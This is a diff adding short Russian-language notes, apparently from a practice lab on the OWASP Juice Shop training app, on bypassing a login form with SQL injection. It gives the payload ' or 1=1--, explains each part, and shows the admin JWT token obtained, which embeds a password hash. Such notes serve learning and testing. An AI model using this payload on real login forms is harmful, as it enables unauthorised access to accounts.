@@ -1,0 +1,19 @@
+1. 
+Данные с сайта https://proglib.io/p/vzlamyvaem-sayty-shpargalka-po-sql-inekciyam-2019-12-21
+обход аутентификации
+Есть стандартный словарь, содержащий в себе основные запросы, для обхода уязвимой формы аутентификации. Впервые его опубликовали лет 10 назад и регулярно дополняют. Не забудьте прогнать через него формы регистрации на своем сайте:
+
+2. 
+в поле логин (login) вводим следующие
+' or 1=1-- 
+
+2.1 
+' начало дополнительного условия
+or само условие "or" / "или"
+1=1 само условие которое всегда равно TRUE
+-- коментим запрос, значит далее не важно что будет записано
+ 
+2.2
+Мы успешно вошли в систему с логином admin 
+Получили токен
+token:"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDUtMTMgMTE6MTA6MjIuOTIyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDUtMTMgMTE6MTA6MjIuOTIyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4Mzk3ODA0MCwiZXhwIjoxNjgzOTk2MDQwfQ.megsSz43s6nJcI0MSilFNVG6IqT-3bOFTE2sTuge02XlwzmfTuQLQ-71xWYUEOlenC1tthMrB2X7oeRKtinqAwxXIw09LUfHgwzO3BFneh2HdpOtm5tOC_rBYdRPzdIX7taKzg4Ei0KXG6BlOu03FbMultN_0nki8ueu2dignT8"
